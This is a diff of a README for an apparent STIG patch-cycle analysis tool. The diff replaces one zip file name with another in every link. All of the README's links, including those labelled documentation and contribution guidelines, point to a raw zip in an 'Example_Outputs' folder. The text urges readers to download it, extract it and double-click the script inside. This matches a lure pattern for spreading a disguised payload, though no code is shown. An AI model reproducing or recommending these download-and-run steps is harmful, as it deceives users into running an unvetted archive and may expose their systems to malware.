@@ -1,6 +1,6 @@
 # 🛠️ DISA-STIG-Patch-Cycle-Analyzer - Analyze Patch Cycles with Ease
 
-[![Download](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)
 
 ## 📖 Overview
 DISA-STIG-Patch-Cycle-Analyzer is a standalone, offline tool designed to help you parse DISA STIG XCCDF manuals. It generates patch-cycle deltas, creates integrity-checked datasets, and provides executive-level summaries to assist in managing regulated environments.
@@ -23,10 +23,10 @@ Follow these steps to download and run the DISA-STIG-Patch-Cycle-Analyzer:
 1. **Visit the Download Page**
    Click the link below to access the releases page where you can download the latest version of the application.
 
-   [Download Now](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)
+   [Download Now](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)
 
 2. **Choose the Correct Version**
-   Look for the latest version on the releases page. The file will typically be named something like `https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip`.
+   Look for the latest version on the releases page. The file will typically be named something like `https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip`.
 
 3. **Download the File**
    Click on the download link for the file to start the download. The file will be saved in your computer's default downloads folder.
@@ -38,9 +38,9 @@ Follow these steps to download and run the DISA-STIG-Patch-Cycle-Analyzer:
    After extracting, you will find the main Python script. Double-click the script (or open it in a terminal) to run the application.
 
 ## 📥 Download & Install
-You can always return to this link for the latest version: [Download Page](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)
+You can always return to this link for the latest version: [Download Page](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)
 
-1. **Visit the Download Page**: [Download Now](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)
+1. **Visit the Download Page**: [Download Now](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)
    
 2. **Follow the Steps**: Follow the steps listed above to ensure a smooth download and installation.
 
@@ -54,7 +54,7 @@ This application is open-source and free to use under the MIT License. Please re
 Join our community to discuss features, report bugs, and share your experiences. Whether you're an expert or just starting, your feedback is valuable.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/STI-Analyzer-Cycle-Patch-DIS-v2.4.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Jhonaz02/DISA-STIG-Patch-Cycle-Analyzer/main/Example_Outputs/Cycle_Analyzer_DIS_STI_Patch_1.2.zip)
 
 Explore the power of the DISA-STIG-Patch-Cycle-Analyzer and efficiently manage your patch cycles today!
